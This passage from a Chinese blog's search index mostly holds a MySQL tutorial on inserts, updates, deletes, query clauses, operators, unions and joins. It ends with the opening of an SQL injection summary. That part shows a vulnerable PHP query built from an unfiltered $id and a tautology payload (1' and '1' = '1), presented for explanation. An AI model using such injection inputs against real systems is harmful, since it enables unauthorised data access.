class="string">&#x27;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>Vue</tag>
      </tags>
  </entry>
  <entry>
    <title>高级数据操作</title>
    <url>/2021/02/03/%E9%AB%98%E7%BA%A7%E6%95%B0%E6%8D%AE%E6%93%8D%E4%BD%9C/</url>
    <content><![CDATA[<h2 id="新增数据"><a href="#新增数据" class="headerlink" title="新增数据"></a>新增数据</h2><h3 id="多数据插入"><a href="#多数据插入" class="headerlink" title="多数据插入"></a>多数据插入</h3><p>只要写一次insert指令，但是可以直接插入多条记录</p>
<p>基本语法：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> 表名 [(字段列表)] <span class="keyword">values</span>(值列表), (值列表)…;</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210202164155169.png" alt="image-20210202164155169"></p>
<h3 id="主键冲突"><a href="#主键冲突" class="headerlink" title="主键冲突"></a>主键冲突</h3><p>主键冲突：在有的表中，使用的是业务主键（字段有业务含义），但是往往在进行数据插入的时候，又不确定数据表中是否已经存在对应的主键。</p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210202170558780.png" alt="image-20210202170558780"></p>
<ol>
<li>主键冲突更新：</li>
</ol>
<p>类似插入数据语法，如果插入的过程中主键冲突，那么采用更新方法。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Insert</span> <span class="keyword">into</span> 表名 [(字段列表)] <span class="keyword">values</span>(值列表) <span class="keyword">on</span> <span class="keyword">duplicate</span> <span class="keyword">key</span> <span class="keyword">update</span> 字段 = 新值;</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210202171903475.png" alt="image-20210202171903475"></p>
<p>2、 主键冲突替换：</p>
<p>当主键冲突之后，干掉原来的数据，重新插入进去。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Replace</span> <span class="keyword">into</span> [(字段列表)] <span class="keyword">values</span>(值列表);</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210202172205947.png" alt="image-20210202172205947"></p>
<h3 id="蠕虫复制"><a href="#蠕虫复制" class="headerlink" title="蠕虫复制"></a>蠕虫复制</h3><p>蠕虫复制：一分为二，成倍的增加。从已有的数据中获取数据，并且将获取到的数据插入到数据表中</p>
<p>基本语法：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Insert</span> <span class="keyword">into</span> 表名 [(字段列表)] <span class="keyword">select</span> */字段列表 <span class="keyword">from</span> 表;</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210202174525318.png" alt="image-20210202174525318"></p>
<p><strong>注意：</strong></p>
<ol>
<li><p>蠕虫复制的确通常是重复数据，没有太大业务意义：可以在短期内快速增加表的数据量，从而可以测试表的压力，还可以通过大量数据来测试表的效率（索引）</p>
</li>
<li><p> 蠕虫复制虽好，但是要注意主键冲突。</p>
</li>
</ol>
<h2 id="更新数据"><a href="#更新数据" class="headerlink" title="更新数据"></a>更新数据</h2><ol>
<li>在更新数据的时候，特别要注意：通常一定是跟随条件更新</li>
</ol>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Update</span> 表名 <span class="keyword">set</span> 字段名 = 新值 <span class="keyword">where</span> 判断条件;</span><br></pre></td></tr></table></figure>
<ol start="2">
<li>如果没有条件，是全表更新数据。但是可以使用limit 来限制更新的数量；</li>
</ol>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Update</span> 表名 <span class="keyword">set</span> 字段名 = 新值 [<span class="keyword">where</span> 判断条件] <span class="keyword">limit</span> 数量; </span><br></pre></td></tr></table></figure>
<p>改变4个a变成e</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Update</span> my_simple <span class="keyword">set</span> <span class="keyword">name</span> = ‘e’ <span class="keyword">where</span> <span class="keyword">name</span> = ‘a’ <span class="keyword">limit</span> <span class="number">4</span>;</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210202175109347.png" alt="image-20210202175109347"></p>
<h2 id="删除数据"><a href="#删除数据" class="headerlink" title="删除数据"></a>删除数据</h2><ol>
<li><p>删除数据的时候尽量不要全部删除，应该使用where进行 判定；</p>
</li>
<li><p>删除数据的时候可以使用limit来限制要删除的具体数量</p>
</li>
</ol>
<p>Delete删除数据的时候无法重置auto_increment</p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/blob/main/blog-img/image-20210202175716150.png" alt="image-20210202175716150"></p>
<p>Mysql有一个能够重置表选项中的自增长的语法;</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">Truncate 表名; 		//==&gt;drop ==&gt;create</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210202175856711.png" alt="image-20210202175856711"></p>
<h2 id="查询数据"><a href="#查询数据" class="headerlink" title="查询数据"></a>查询数据</h2><p>完整的查询指令：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Select</span> <span class="keyword">select</span>选项 字段列表 <span class="keyword">from</span> 数据源 <span class="keyword">where</span>条件 <span class="keyword">group</span> <span class="keyword">by</span>分组 <span class="keyword">having</span>条件 <span class="keyword">order</span> <span class="keyword">by</span>排序 <span class="keyword">limit</span>限制;</span><br></pre></td></tr></table></figure>
<p>Select选项：系统该如何对待查询得到的结果</p>
<p>All：默认的，表示保存所有的记录</p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210202195449435.png" alt="image-20210202195509950"></p>
<p>Distinct：去重，去除重复的记录，只保留一条（所有的字段都相同）</p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210202195449435.png" alt="image-20210202195449435"></p>
<p>字段列表：有的时候需要从多张表获取数据，在获取数据的时候，可能存在不同表中有同名的字段，需要将同名的字段命名成不同名的：别名 alias</p>
<p>基本语法：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">字段名 [as] 别名</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210202195838373.png" alt="image-20210202195838373"></p>
<h3 id="From数据源"><a href="#From数据源" class="headerlink" title="From数据源"></a>From数据源</h3><p>From是为前面的查询提供数据：数据源只要是一个符合二维表结构的数据即可。</p>
<h4 id="单表数据"><a href="#单表数据" class="headerlink" title="单表数据"></a>单表数据</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">From 表名;</span><br></pre></td></tr></table></figure>
<h4 id="多表数据"><a href="#多表数据" class="headerlink" title="多表数据"></a>多表数据</h4><p>从多张表获取数据，基本语法：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">from 表1,表2…</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210202200204061.png" alt="image-20210202200204061"></p>
<p>结果：两张表的记录数相乘，字段数拼接</p>
<p>本质：从第一张表取出一条记录，去拼凑第二张表的所有记录，保留所有结果。得到的结果在数学上有一个专业的说法：笛卡尔积，这个结果出了给数据库造成压力，没有其他意义：应该尽量避免出现笛卡尔积。</p>
<h4 id="动态数据"><a href="#动态数据" class="headerlink" title="动态数据"></a>动态数据</h4><p>From后面跟的数据不是一个实体表，而是一个从表中查询出来得到的二维结果表（子查询）。</p>
<p>基本语法：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">from (<span class="keyword">select</span> 字段列表 <span class="keyword">from</span> 表) <span class="keyword">as</span> 别名;</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210202200630599.png" alt="image-20210202200630599"></p>
<h3 id="Where子句"><a href="#Where子句" class="headerlink" title="Where子句"></a>Where子句</h3><p>Where字句：用来从数据表获取数据的时候，然后进行条件筛选。</p>
<p> 数据获取原理：针对表去对应的磁盘处获取所有的记录（一条条），where的作用就是在拿到一条结果就开始进行判断，判断是否符合条件：如果符合就保存下来，如果不符合直接舍弃（不放到内存中）</p>
<p>Where是通过运算符进行结果比较来判断数据。</p>
<h3 id="Group-by子句"><a href="#Group-by子句" class="headerlink" title="Group by子句"></a>Group by子句</h3><p>Group by表示分组的含义：根据指定的字段，将数据进行分组：分组的目标是为了统计</p>
<h4 id="分组统计"><a href="#分组统计" class="headerlink" title="分组统计"></a>分组统计</h4><p>基本语法： </p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">group by 字段名;</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210202202118076.png" alt="image-20210202202118076"></p>
<p>Group by是为了分组后进行数据统计的，如果只是想看数据显示，那么group by没什么含义：group by将数据按照指定的字段分组之后，只会保留每组的第一条记录。</p>
<p>利用一些统计函数：（聚合函数）</p>
<p>count()：统计每组中的数量，如果统计目标是字段，那么不统计为空NULL字段，如果为*那么代表统计记录</p>
<p>avg()：求平均值</p>
<p>sum()：求和</p>
<p>max()：求最大值</p>
<p>min()：求最小值</p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/blob/main/blog-img/image-20210202202919761.png" alt="image-20210202202919761"></p>
<p>Group_concat()：为了将分组中指定的字段进行合并（字符串拼接）</p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/blob/main/blog-img/image-20210202203214011.png" alt="image-20210202203214011"></p>
<h4 id="多分组"><a href="#多分组" class="headerlink" title="多分组"></a>多分组</h4><p>将数据按照某个字段进行分组之后，对已经分组的数据进行再次分组</p>
<p> 基本语法：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">group by 字段1,字段2; 	//先按照字段1进行排序，之后将结果再按照字段2进行排序，以此类推。</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210202204051331.png" alt="image-20210202204051331"></p>
<h4 id="分组排序"><a href="#分组排序" class="headerlink" title="分组排序"></a>分组排序</h4><p>Mysql中，分组默认有排序的功能：按照分组字段进行排序，默认是升序</p>
<p>基本语法：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">group by 字段 [asc|desc]，字段 [asc|desc]</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210202204259895.png" alt="image-20210202204259895"></p>
<h4 id="回溯统计"><a href="#回溯统计" class="headerlink" title="回溯统计"></a>回溯统计</h4><p>当分组进行多分组之后，往上统计的过程中，需要进行层层上报，将这种层层上报统计的过程称之为回溯统计：每一次分组向上统计的过程都会产生一次新的统计数据，而且当前数据对应的分组字段为NULL。</p>
<p>基本语法：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">group by 字段 [asc|desc] <span class="keyword">with</span> <span class="keyword">rollup</span>;</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210202205036929.png" alt="image-20210202205036929"></p>
<p>多分组回溯统计</p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210202205036929.png" alt="image-20210202205308366"></p>
<h3 id="Having子句"><a href="#Having子句" class="headerlink" title="Having子句"></a>Having子句</h3><p>Having的本质和where一样，是用来进行数据条件筛选。</p>
<ol>
<li>Having是在group by子句之后：可以针对分组数据进行统计筛选，但是where不行</li>
</ol>
<p>查询班级人数大于等于4个以上的班级</p>
<p>Where不能使用聚合函数：聚合函数是用在group by分组的时候，where已经运行完毕</p>
<p>Having在group by分组之后，可以使用聚合函数或者字段别名（where是从表中取出数据，别名是在数据进入到内存之后才有的）</p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210202210945795.png" alt="image-20210202210945795"></p>
<p>强调：having是在group by之后，group by是在where之后：where的时候表示将数据从磁盘拿到内存，where之后的所有操作都是内存操作。</p>
<h3 id="Order-by子句"><a href="#Order-by子句" class="headerlink" title="Order by子句"></a>Order by子句</h3><p>Order by排序：根据校对规则对数据进行排序</p>
<p>基本语法：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">order by 字段 [asc|desc];       //asc升序，默认的</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210202211211080.png" alt="image-20210202211211080"></p>
<p>Order by也可以像group by一样进行多字段排序：先按照第一个字段进行排序，然后再按照第二个字段进行排序。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">Order by 字段1 规则,字段2 规则;</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210202211351221.png" alt="image-20210202211351221"></p>
<h3 id="Limit子句"><a href="#Limit子句" class="headerlink" title="Limit子句"></a>Limit子句</h3><p>Limit限制子句：主要是用来限制记录数量获取</p>
<h4 id="记录数限制"><a href="#记录数限制" class="headerlink" title="记录数限制"></a>记录数限制</h4><p>纯粹的限制获取的数量：从第一条到指定的数量</p>
<p>基本语法：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">limit 数量;</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210202211547883.png" alt="image-20210202211547883"></p>
<p>Limit通常在查询的时候如果限定为一条记录的时候，使用的比较多：有时候获取多条记录并不能解决业务问题，但是会增加服务器的压力。</p>
<h4 id="分页"><a href="#分页" class="headerlink" title="分页"></a>分页</h4><p>利用limit来限制获取指定区间的数据。</p>
<p>基本语法：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">limit offset,length;   	//offset偏移量：从哪开始，length就是具体的获取多少条记录</span><br></pre></td></tr></table></figure>
<p>Mysql中记录的数量从0开始</p>
<p>Limit 0,2; 表示获取前两条记录</p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210202211751605.png" alt="image-20210202211751605"></p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/blob/main/blog-img/image-20210202211838240.png" alt="image-20210202211838240"></p>
<p>注意：limit后面的length表示最多获取对应数量，但是如果数量不够，系统不会强求</p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/blob/main/blog-img/image-20210202211824015.png" alt="image-20210202211824015"></p>
<h2 id="查询中的运算符"><a href="#查询中的运算符" class="headerlink" title="查询中的运算符"></a>查询中的运算符</h2><h3 id="算术运算符"><a href="#算术运算符" class="headerlink" title="算术运算符"></a>算术运算符</h3><p>+、-、*、/、%</p>
<p>基本算术运算：通常不在条件中使用，而是用于结果运算（select 字段中）</p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210202220941715.png" alt="image-20210202220941715"></p>
<h3 id="比较运算符"><a href="#比较运算符" class="headerlink" title="比较运算符"></a>比较运算符</h3><p>&gt;、&gt;=、&lt;、&lt;=、=、&lt;&gt;</p>
<p>通常是用来在条件中进行限定结果</p>
<p>=：在mysql中，没有对应的 ==比较符号，就是使用=来进行相等判断</p>
<p>&lt;=&gt;：相等比较</p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210202221233574.png" alt="image-20210202221233574"></p>
<p>特殊应用：就是在字段结果中进行比较运算</p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210202221508097.png" alt="image-20210202221508097"></p>
<p>在条件判断的时候，还有有对应的比较运算符：计算区间</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">Between 条件1 and 条件2;		//闭区间查找</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210202221632673.png" alt="image-20210202221632673"></p>
<p>Between中条件1必须小于条件2，反过来不可以</p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210202221722572.png" alt="image-20210202221722572"></p>
<h3 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h3><p>and、or、not</p>
<p>and：逻辑与</p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210202221827339.png" alt="image-20210202221827339"></p>
<p>or：逻辑或</p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210202221916855.png" alt="image-20210202221916855"></p>
<p>not：逻辑非</p>
<h3 id="In运算符"><a href="#In运算符" class="headerlink" title="In运算符"></a>In运算符</h3><p>In：在什么里面，是用来替代=，当结果不是一个值，而是一个结果集的时候</p>
<p>基本语法：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">in (结果1,结果2,结果3…)		//只要当前条件在结果集中出现过，那么就成立</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/blob/main/blog-img/image-20210202222100602.png" alt="image-20210202222100602"></p>
<h3 id="Is运算符"><a href="#Is运算符" class="headerlink" title="Is运算符"></a>Is运算符</h3><p>Is是专门用来判断字段是否为NULL的运算符</p>
<p>基本语法：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">is null / is not null</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210202222324678.png" alt="image-20210202222324678"></p>
<h3 id="Like运算符"><a href="#Like运算符" class="headerlink" title="Like运算符"></a>Like运算符</h3><p>Like运算符：是用来进行模糊匹配（匹配字符串）</p>
<p>基本语法：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">like ‘匹配模式’;</span><br></pre></td></tr></table></figure>
<p> 匹配模式中，有两种占位符：</p>
<p>_：匹配对应的单个字符</p>
<p>%：匹配多个字符</p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210202222501980.png" alt="image-20210202222501980"></p>
<h2 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h2><h3 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h3><p>联合查询是可合并多个相似的选择查询的结果集。等同于将一个表追加到另一个表，从而实现将两个表的查询组合到一起，使用谓词为UNION或UNION ALL。</p>
<p> 联合查询：将多个查询的结果合并到一起（纵向合并）：字段数不变，多个查询的记录数合并。</p>
<h3 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h3><ol>
<li><p>将同一张表中不同的结果（需要对应多条查询语句来实现），合并到一起展示数据</p>
<p>男生身高升序排序，女生身高降序排序</p>
</li>
<li><p>最常见：在数据量大的情况下，会对表进行分表操作，需要对每张表进行部分数据统计，使用联合查询来讲数据存放到一起显示。</p>
<p>QQ1表获取在线数据</p>
<p>QQ2表获取在线数据 —》将所有在线的数据显示出来</p>
</li>
</ol>
<h3 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h3><p>基本语法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Select 语句 Union [union 选项] Select 语句;</span><br></pre></td></tr></table></figure>
<p>Union选项：与select选项基本一样</p>
<ul>
<li>Distinct：去重，去掉完全重复的数据（默认的）</li>
</ul>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210203125848085.png" alt="image-20210203125848085"></p>
<ul>
<li>All：保存所有的结果</li>
</ul>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210203125909251.png" alt="image-20210203125909251"></p>
<p><strong>注意细节：</strong>union理论上只要保证字段数一样，不需要每次拿到的数据对应的字段类型一致。永远只保留第一个select语句对应的字段名字。</p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210203130100920.png" alt="image-20210203130100920"></p>
<h3 id="Order-by的使用"><a href="#Order-by的使用" class="headerlink" title="Order by的使用"></a>Order by的使用</h3><ol>
<li>在联合查询中，如果要使用order by，那么对应的select语句必须使用括号括起来</li>
</ol>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210203130402708.png" alt="image-20210203130402708"></p>
<ol start="2">
<li>orderby在联合查询中若要生效，必须配合使用limit：而limit后面必须跟对应的限制数量（通常可以使用一个较大的值：大于对应表的记录数）</li>
</ol>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210203130520207.png" alt="image-20210203130520207"></p>
<h2 id="连接查询"><a href="#连接查询" class="headerlink" title="连接查询"></a>连接查询</h2><p>连接查询：将多张表连到一起进行查询（会导致记录数行和字段数列发生改变）</p>
<h3 id="连接查询的意义"><a href="#连接查询的意义" class="headerlink" title="连接查询的意义"></a>连接查询的意义</h3><p>在关系型数据库设计过程中，实体（表）与实体之间是存在很多联系的。在关系型数据库表的设计过程中，遵循着关系来设计：一对一，一对多和多对多，通常在实际操作的过程中，需要利用这层关系来保证数据的完整性。</p>
<h3 id="连接查询分类"><a href="#连接查询分类" class="headerlink" title="连接查询分类"></a>连接查询分类</h3><p>连接查询一共有以下几类：</p>
<ul>
<li><p>交叉连接</p>
</li>
<li><p>内连接</p>
</li>
<li><p>外连接：左外连接（左连接）和右外连接（右连接）</p>
</li>
<li><p>自然连接</p>
</li>
</ul>
<h3 id="交叉连接"><a href="#交叉连接" class="headerlink" title="交叉连接"></a>交叉连接</h3><p>交叉连接：将两张表的数据与另外一张表彼此交叉</p>
<h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><ol>
<li><p>从第一张表依次取出每一条记录</p>
</li>
<li><p>取出每一条记录之后，与另外一张表的全部记录挨个匹配</p>
</li>
<li><p>没有任何匹配条件，所有的结果都会进行保留</p>
</li>
<li><p>记录数 = 第一张表记录数 * 第二张表记录数；字段数 = 第一张表字段数 + 第二张表字段数（笛卡尔积）</p>
</li>
</ol>
<h4 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h4><p>基本语法：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">表1 cross join 表2;</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210203131410259.png" alt="image-20210203131410259"></p>
<h4 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h4><p>交叉连接产生的结果是笛卡尔积，没有实际应用。</p>
<p>本质：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">from 表1,表2;</span><br></pre></td></tr></table></figure>


<h3 id="内连接"><a href="#内连接" class="headerlink" title="内连接"></a>内连接</h3><p>内连接：inner join，从一张表中取出所有的记录去另外一张表中匹配：利用匹配条件进行匹配，成功了则保留，失败了放弃。</p>
<h4 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h4><ol>
<li><p>从第一张表中取出一条记录，然后去另外一张表中进行匹配</p>
</li>
<li><p>利用匹配条件进行匹配：</p>
<p>2.1 匹配到：保留，继续向下匹配</p>
<p>2.2 匹配失败：向下继续，如果全表匹配失败，结束</p>
</li>
</ol>
<h4 id="语法-1"><a href="#语法-1" class="headerlink" title="语法"></a>语法</h4><p>基本语法：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">表1 [inner] join 表2 on 匹配条件;</span><br></pre></td></tr></table></figure>
<ol>
<li>如果内连接没有条件（允许），那么其实就是交叉连接（避免）</li>
</ol>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210203132128041.png" alt="image-20210203132128041"></p>
<ol start="2">
<li>使用匹配条件进行匹配</li>
</ol>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210203132218790.png" alt="image-20210203132218790"></p>
<ol start="3">
<li>因为表的设计通常容易产生同名字段，尤其是ID，所以为了避免重名出现错误，通常使用表名.字段名，来确保唯一性</li>
</ol>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210203132326158.png" alt="image-20210203132326158"></p>
<ol start="4">
<li>通常，如果条件中使用到对应的表名，而表名通常比较长，所以可以通过表别名来简化</li>
</ol>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210203132503852.png" alt="image-20210203132503852"></p>
<ol start="5">
<li>内连接匹配的时候，必须保证匹配到才会保存</li>
</ol>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210203132715803.png" alt="image-20210203132715803"></p>
<ol start="6">
<li>内连接因为不强制必须使用匹配条件（on）因此可以在数据匹配完成之后，使用where条件来限制，效果与on一样（建议使用on）</li>
</ol>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210203132850279.png" alt="image-20210203132850279"></p>
<h4 id="应用-1"><a href="#应用-1" class="headerlink" title="应用"></a>应用</h4><p>内连接通常是在对数据有精确要求的地方使用：必须保证两种表中都能进行数据匹配。</p>
<h3 id="外连接"><a href="#外连接" class="headerlink" title="外连接"></a>外连接</h3><p>外链接：outer join，按照某一张表作为主表（表中所有记录在最后都会保留），根据条件去连接另外一张表，从而得到目标数据。</p>
<p> 外连接分为两种：左外连接（left join），右外连接（right join）</p>
<ul>
<li><p>左连接：左表是主表</p>
</li>
<li><p>右连接：右表是主表</p>
</li>
</ul>
<h4 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h4><ol>
<li><p>确定连接主表：左连接就是left join左边的表为主表；right join就是右边为主表</p>
</li>
<li><p>拿主表的每一条记录，去匹配另外一张表（从表）的每一条记录</p>
</li>
<li><p>如果满足匹配条件：保留；不满足即不保留</p>
</li>
<li><p>如果主表记录在从表中一条都没有匹配成功，那么也要保留该记录：从表对应的字段值都未NULL</p>
</li>
</ol>
<h4 id="语法-2"><a href="#语法-2" class="headerlink" title="语法"></a>语法</h4><p>基本语法：</p>
<p>左连接：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">主表 left join 从表 on 连接条件;</span><br></pre></td></tr></table></figure>
<p>右连接：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">从表 right join 主表 on连接条件;</span><br></pre></td></tr></table></figure>
<p> 左连接对应的主表数据在左边；右连接对应的主表数据在右边：</p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210203150620682.png" alt="image-20210203150620682"></p>
<p>右连接查看数据</p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210203150715164.png" alt="image-20210203150715164"></p>
<p><strong>特点：</strong></p>
<ol>
<li><p>外连接中主表数据记录一定会保存：连接之后不会出现记录数少于主表（内连接可能）</p>
</li>
<li><p>左连接和右连接其实可以互相转换，但是数据对应的位置（表顺序）会改变</p>
</li>
</ol>
<h4 id="应用-2"><a href="#应用-2" class="headerlink" title="应用"></a>应用</h4><p>非常常用的一种获取的数据方式：作为数据获取对应主表以及其他数据（关联）</p>
<h3 id="Using关键字"><a href="#Using关键字" class="headerlink" title="Using关键字"></a>Using关键字</h3><p>是在连接查询中用来代替对应的on关键字的，进行条件匹配。</p>
<h4 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h4><ol>
<li><p>在连接查询时，使用on的地方用using代替</p>
</li>
<li><p>使用using的前提是对应的两张表连接的字段是同名（类似自然连接自动匹配）</p>
</li>
<li><p>如果使用using关键字，那么对应的同名字段，最终在结果中只会保留一个。</p>
</li>
</ol>
<h4 id="语法-3"><a href="#语法-3" class="headerlink" title="语法"></a>语法</h4><p>基本语法：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">表1 [inner,left,right] join 表2 using(同名字段列表); 	//连接字段</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210203151711963.png" alt="image-20210203151711963"></p>
]]></content>
      <categories>
        <category>后端</category>
      </categories>
      <tags>
        <tag>SQL</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL注入总结</title>
    <url>/2021/03/07/SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<p>SQL注入是一种通过操作输入来修改后台SQL语句达到代码执行进行攻击目的的技术。</p>
<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>首先来看一下基本的SQL语句查询原码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span></span><br></pre></td></tr></table></figure>
<p>这里的 <code>$id</code> 参数是我们提交的变量，如果我们对这个参数没有做检查或者没有十分严格的过滤时，就可能存在SQL注入的漏洞。</p>
<p>比如</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">id &#x3D; 1&#39; and &#39;1&#39; &#x3D; &#39;1</span><br></pre></td></tr></table></figure>
